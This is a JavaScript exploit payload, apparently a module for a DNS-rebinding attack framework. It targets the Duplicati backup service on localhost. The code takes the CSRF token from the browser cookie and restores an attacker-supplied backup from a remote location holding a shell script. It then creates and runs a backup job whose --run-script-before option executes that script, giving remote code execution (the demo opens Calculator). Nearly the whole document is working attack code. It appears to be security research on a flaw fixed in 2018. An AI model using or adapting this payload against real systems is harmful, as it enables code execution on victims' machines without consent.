/*
This payload exploits Duplicati (https://www.duplicati.com/, a backup system.
The issue was fixed in Duplicati version v2.0.3.11-2.0.3.11_canary_2018-09-05.

The exploit takes the following steps:
  * fetches a cookie/CSRF token from localhost
  * restores an attacker provided backup file that contains a shell script ( `/tmp/myscript.sh`), 
    from a configurable location supported by duplicati, including google drive, S3 etc.
  * creates a backup that will run this shell script
  * Runs the backup and this shell script
  * This shell script starts a calculator on Mac.
The default port for duplicati is TCP 8200 (localhost:8200).

The exploit is interesting in that it requires several different steps to execute.

IMPORTANT: Parameter "targetURL" must be updated to link to an attacker backup file,
containing the shell script.

Sample script:
#!/bin/sh
# Attacker must place script in /tmp/myscript.sh 

/bin/sh -c '/usr/bin/open -na /Applications/Calculator.app'

*/

const DuplicatiRCE = () => {

    /*   Insert the location of your backup of a "malicious" shell script below.
"FTP, SSH, WebDAV as well as popular services like Microsoft OneDrive, 
Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others 
(https://www.duplicati.com/)."*/

    const targetURL = "TargetURL";

    function restoreIsCompleted(taskId, headers) {
        let maxAttempts = 5;
        let attempt = 0;
        return new Promise(function (resolve, reject) {
            (function fetchRestoreJobStatus() {
                headers.delete("content-type");
                headers.append("content-type", "application/json");
                fetch(`/api/v1/task/${taskId}`, {
                    method: 'GET',
                    credentials: 'include',
                    headers: headers,
                })
                    .then(responseOKOrFail('Could not fetch restore job status'))
                    .then(function (d) {
                        data = JSON.parse(d)
                        if (data.Status == "Completed") {
                            return resolve();
                        } else {
                            if (attempt == maxAttempts) {
                                throw 'Could not fetch restore job status after a number of attempts'
                            }
                            attempt++;
                            setTimeout(fetchRestoreJobStatus, 5000);
                        }
                    })
            })();
        });
    }

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        let tokenResponse;
        let tokenData;
        let myCookie;
        let myHeaders = new Headers();

        let formData = new URLSearchParams();
        formData.append("time", "2018-04-26T19:03:34-07:00");
        formData.append("restore-path", "");
        formData.append("overwrite", "true");
        formData.append("permissions", "true");
        formData.append("paths", '["/tmp/*"]');


        let restoreRequestPayload = {
            "Backup": {
                "TargetURL": targetURL,
                "Settings": [{
                    "Name": "--no-encryption",
                    "Value": "true"
                }]
            }
        }

        let createBackupPayload = {
            "Backup": {
                "Settings": [{
                    "Name": "encryption-module",
                    "Value": null
                }, {
                    "Name": "compression-module",
                    "Value": "zip"
                }, {
                    "Name": "dblock-size",
                    "Value": "50mb"
                }, {
                    "Name": "--no-encryption",
                    "Value": "true",
                    "Filter": "",
                    "Argument": null
                }, {
                    "Name": "--run-script-before",
                    "Value": "/tmp/myscript.sh",
                    "Filter": "",
                    "Argument": null
                }],
                "Filters": [],
                "Sources": ["/usr/bin/yes"],
                "Name": "myDummyBackup",
                "TargetURL": "file:///tmp/",
                "DBPath": null
            },
            "Schedule": null
        }

        /* Fetch cookie/CSRF token */
        fetch('/', {
                credentials: 'include',
            })
            .then(responseOKOrFail("Could not submit a request to restore a backup"))
            .then(function (d) { //data
                tokenData = d;
                /*Restore 'malicious' backup from Google Drive or other backends*/
                myCookie = document.cookie;
                let array = myCookie.replace(/%2B/g, "+").replace(/%2F/g, "/")
                    .split('=');
                myHeaders.append("X-XSRF-Token", unescape(array[1]));
                myHeaders.append("content-type", "application/json");
                return fetch('/api/v1/backups?temporary=true', {
                    method: 'POST',
                    credentials: 'include',
                    headers: myHeaders,
                    body: JSON.stringify(restoreRequestPayload)
                })
            })
            .then(responseOKOrFail("Could not submit a request to restore a backup"))
            .then(function (restoreData) { //data
                let rr = JSON.parse(restoreData);
                myHeaders.delete("content-type");
                myHeaders.append("content-type", "application/x-www-form-urlencoded;charset=UTF-8");
                return fetch(`/api/v1/backup/${rr.ID}/restore`, {
                    method: 'POST',
                    credentials: 'include',
                    headers: myHeaders,
                    body: formData,
                })

            })
            .then(responseOKOrFail("Could not restore backup"))
            .then(function (d) { //data

                /*Poll service to determine if 'malicious ' backup was restored*/
                return restoreIsCompleted(JSON.parse(d).TaskID, myHeaders)
            }).then(function (d) { //data

                /*Create a new backup job, that defines a script to run. 
                This script is taken from the restored backup*/
                myHeaders.delete("content-type");
                myHeaders.append("content-type",
                    "application/json");
                return fetch(
                    "/api/v1/backups", {
                        method: 'POST',
                        credentials: 'include',
                        headers: myHeaders,
                        body: JSON.stringify(createBackupPayload),
                    })
            })
            .then(responseOKOrFail("Could not create backup"))
            .then(function (d) { // data

                /* Run configured backup + RCE */
                job = JSON.parse(d);
                return fetch(`/api/v1/backup/${job.ID}/run`, {
                    method: 'POST',
                    credentials: 'include',
                    headers: myHeaders,
                })
            })
            .then(responseOKOrFail("Could not run configured backup"))
            .then(function (d) { // data`
                console.log(`success: ${d}`);
            })
            .catch(e => console.log(e));
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        // We do not check for version in this example
        let detected = false;

        if (body === null) {
            return detected;
        }

        if ((body.includes('<title>Backup</title>') &&
        headers.get('Server') === 'Tiny WebServer') === true) {
            detected = true;
        }
        return detected;
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Duplicati RCE"] = DuplicatiRCE();



